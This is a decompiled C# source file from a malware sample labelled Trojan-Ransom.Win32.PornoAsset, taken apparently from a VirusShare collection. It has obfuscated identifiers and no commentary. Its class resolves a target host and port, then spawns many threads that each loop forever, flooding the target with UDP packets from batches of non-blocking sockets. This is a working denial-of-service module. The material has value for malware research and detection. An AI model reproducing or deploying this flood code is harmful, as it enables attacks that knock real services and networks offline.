// Decompiled with JetBrains decompiler
// Type: ___codefort.S
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ___codefort
{
  internal sealed class S
  {
    private static ThreadStart[] \u0002;
    private static Thread[] \u0003;
    public static string \u0005;
    private static IPEndPoint \u0008;
    public static ushort \u0006;
    public static int bd;
    private static S.\u0002[] bc;
    public static int P;
    public static int O;

    public static void \u0002()
    {
      try
      {
        S.\u0008 = new IPEndPoint(Dns.GetHostEntry(S.\u0005).AddressList[0], (int) S.\u0006);
      }
      catch
      {
        S.\u0008 = new IPEndPoint(IPAddress.Parse(S.\u0005), (int) S.\u0006);
      }
      S.\u0003 = new Thread[S.P];
      S.\u0002 = new ThreadStart[S.P];
      S.bc = new S.\u0002[S.P];
      for (int index = 0; index < S.P; ++index)
      {
        S.bc[index] = new S.\u0002(S.\u0008, S.O, S.bd);
        S.\u0002[index] = new ThreadStart(S.bc[index].\u0002);
        S.\u0003[index] = new Thread(S.\u0002[index]);
        S.\u0003[index].Start();
      }
    }

    public static void \u0003()
    {
      for (int index = 0; index < S.P; ++index)
      {
        try
        {
          S.\u0003[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private sealed class \u0002
    {
      private IPEndPoint \u0002;
      private int \u0003;
      private Socket[] \u0005;
      private int \u0008;

      public \u0002(IPEndPoint _param1, int _param2, int _param3)
      {
        this.\u0002 = _param1;
        this.\u0008 = _param2;
        this.\u0003 = _param3;
      }

      public void \u0002()
      {
        while (true)
        {
          byte[] buffer = new byte[this.\u0003];
          try
          {
            this.\u0005 = new Socket[this.\u0008];
            for (int index = 0; index < this.\u0008; ++index)
            {
              this.\u0005[index] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
              this.\u0005[index].Blocking = false;
              this.\u0005[index].SendTo(buffer, (EndPoint) this.\u0002);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.\u0008; ++index)
            {
              if (this.\u0005[index].Connected)
                this.\u0005[index].Disconnect(false);
              this.\u0005[index].Close();
              this.\u0005[index] = (Socket) null;
            }
            this.\u0005 = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.\u0008; ++index)
            {
              try
              {
                if (this.\u0005[index].Connected)
                  this.\u0005[index].Disconnect(false);
                this.\u0005[index].Close();
                this.\u0005[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
